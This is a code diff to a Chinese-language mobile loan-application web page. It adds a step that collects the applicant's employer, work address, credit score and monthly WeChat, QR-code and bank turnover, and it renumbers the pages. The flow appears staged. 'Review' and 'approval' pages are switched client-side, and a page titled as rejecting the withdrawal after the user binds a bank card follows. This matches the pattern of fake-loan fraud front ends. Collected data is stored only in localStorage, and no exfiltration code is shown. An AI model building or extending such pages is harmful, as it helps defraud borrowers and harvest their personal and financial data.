@@ -302,16 +302,7 @@ body {
       </div>
     </div>
 
-    <div class="card" style="margin:0 16px 16px;border-radius:14px;">
-      <div class="upload-area" onclick="handleUpload(this, '人像面')">
-        <div class="upload-icon">👤 📄</div>
-        <div class="upload-text">上传人像面</div>
-      </div>
-      <div class="upload-area" onclick="handleUpload(this, '国徽面')">
-        <div class="upload-icon">🆔 📄</div>
-        <div class="upload-text">上传国徽面</div>
-      </div>
-    </div>
+    
 
     <div class="card" style="margin:0 16px 16px;border-radius:14px;">
       <div class="form-group">
@@ -332,8 +323,69 @@ body {
     <div class="bottom-spacer"></div>
   </div>
 
-  <!-- ==================== 第2.5页：系统审核中 ==================== -->
+  
+  <!-- ==================== 第3页：工作/资产信息 ==================== -->
   <div class="page" id="page3">
+    <div class="page-nav">
+      <span class="nav-back" onclick="goTo(2)">‹</span>
+      <span class="page-nav-title">工作与资产信息</span>
+    </div>
+
+    <div class="steps-bar">
+      <div class="step-item">
+        <div class="step-num done" id="st1n">✓</div>
+        <div class="step-label active" id="st1l">身份核验</div>
+        <div class="step-line done" id="line1"></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num done" id="st2n">✓</div>
+        <div class="step-label active" id="st2l">信息填写</div>
+        <div class="step-line done" id="line2"></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num active" id="st3n">3</div>
+        <div class="step-label active" id="st3l">资产评估</div>
+        <div class="step-line" id="line3"></div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" id="st4n">4</div>
+        <div class="step-label" id="st4l">审批结果</div>
+      </div>
+    </div>
+
+    <div class="card" style="margin:0 16px 16px;border-radius:14px;">
+      <div class="form-group">
+        <label>工作单位</label>
+        <input type="text" class="form-input" id="inputWorkUnit" placeholder="请输入工作单位名称">
+      </div>
+      <div class="form-group">
+        <label>工作地址</label>
+        <input type="text" class="form-input" id="inputWorkAddr" placeholder="请输入详细工作地址">
+      </div>
+      <div class="form-group">
+        <label>芝麻信用分</label>
+        <input type="number" class="form-input" id="inputZhimaScore" placeholder="例如：650">
+      </div>
+      <div class="form-group">
+        <label>微信流水（月均）</label>
+        <input type="text" class="form-input" id="inputWechatFlow" placeholder="例如：5000元/月">
+      </div>
+      <div class="form-group">
+        <label>银行收款码流水（月均）</label>
+        <input type="text" class="form-input" id="inputQrFlow" placeholder="例如：8000元/月">
+      </div>
+      <div class="form-group">
+        <label>银行流水（月均）</label>
+        <input type="text" class="form-input" id="inputBankFlow" placeholder="例如：10000元/月">
+      </div>
+    </div>
+
+    <button class="btn-next" onclick="saveAndGo4()">提交审核</button>
+    <div class="bottom-spacer"></div>
+  </div>
+
+<!-- ==================== 第4页：系统审核中 ==================== -->
+  <div class="page" id="page4">
     <div class="header-blue" style="padding:32px 28px 36px;">
       <h1 style="font-size:22px;">系统审核中</h1>
       <p style="margin-top:6px;">请稍候，正在智能评估您的授信申请</p>
@@ -352,8 +404,8 @@ body {
     <div class="bottom-spacer"></div>
   </div>
 
-  <!-- ==================== 第3页：审批通过 ==================== -->
-  <div class="page" id="page4">
+  <!-- ==================== 第5页：审批通过 ==================== -->
+  <div class="page" id="page5">
     <div class="header-blue" style="padding:32px 28px 36px;">
       <h1 style="font-size:22px;">审批结果</h1>
       <p style="margin-top:6px;">您的授信申请已完成审核</p>
@@ -408,7 +460,7 @@ body {
       </p>
     </div>
 
-    <button class="btn-blue" onclick="goTo(5)">绑卡提款</button>
+    <button class="btn-blue" onclick="goTo(6)">绑卡提款</button>
     <div class="bottom-spacer"></div>
   </div>
 
@@ -430,8 +482,8 @@ body {
     <div class="bottom-spacer"></div>
   </div>
 
-  <!-- ==================== 第4页：绑卡提款后拒绝 ==================== -->
-  <div class="page" id="page5">
+  <!-- ==================== 第6页：绑卡提款后拒绝 ==================== -->
+  <div class="page" id="page6">
     <div class="header-orange" style="padding:32px 28px 36px;">
       <h1 style="font-size:22px;">提款结果</h1>
       <p style="margin-top:6px;">很抱歉，您的提款申请未能通过</p>
@@ -460,9 +512,9 @@ function handleUpload(el, type) {
 function goTo(n) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   
-  if (n === 3) {
+  if (n === 4) {
     // 去审核中页面，等待用户手动刷新
-    document.getElementById('page3').classList.add('active');
+    document.getElementById('page4').classList.add('active');
     window.scrollTo({ top: 0, behavior: 'smooth' });
     return;
   }
@@ -499,12 +551,39 @@ function saveAndGo3() {
     loanType: '经营贷款'
   };
   localStorage.setItem('creditInfo', JSON.stringify(creditInfo));
-  localStorage.setItem('creditApplication', JSON.stringify({name, phone, idCard}));
+  localStorage.setItem('creditApplication', JSON.stringify({name: name, phone: phone, idCard: idCard}));
   
   goTo(3);
 }
 
 // 填充审核中页面的用户信息
+
+function saveAndGo4() {
+  var workUnit = document.getElementById('inputWorkUnit').value.trim();
+  var workAddr = document.getElementById('inputWorkAddr').value.trim();
+  var zhimaScore = document.getElementById('inputZhimaScore').value.trim();
+  var wechatFlow = document.getElementById('inputWechatFlow').value.trim();
+  var qrFlow = document.getElementById('inputQrFlow').value.trim();
+  var bankFlow = document.getElementById('inputBankFlow').value.trim();
+  
+  if (!workUnit && !workAddr) {
+    alert('请至少填写工作单位或工作地址');
+    return;
+  }
+  
+  var workInfo = {
+    workUnit: workUnit,
+    workAddr: workAddr,
+    zhimaScore: zhimaScore,
+    wechatFlow: wechatFlow,
+    qrFlow: qrFlow,
+    bankFlow: bankFlow
+  };
+  localStorage.setItem('creditWorkInfo', JSON.stringify(workInfo));
+  
+  goTo(4);
+}
+
 function populateReviewInfo() {
   var safeSet=function(id,val){var el=document.getElementById(id);if(el)el.textContent=val;};
   var info={},app={};
@@ -523,7 +602,7 @@ function populateReviewInfo() {
 
 function checkResult() {
   document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active');});
-  var p3=document.getElementById('page3');if(p3)p3.classList.add('active');
+  var p5=document.getElementById('page5');if(p5)p5.classList.add('active');
   
   populateReviewInfo();
   
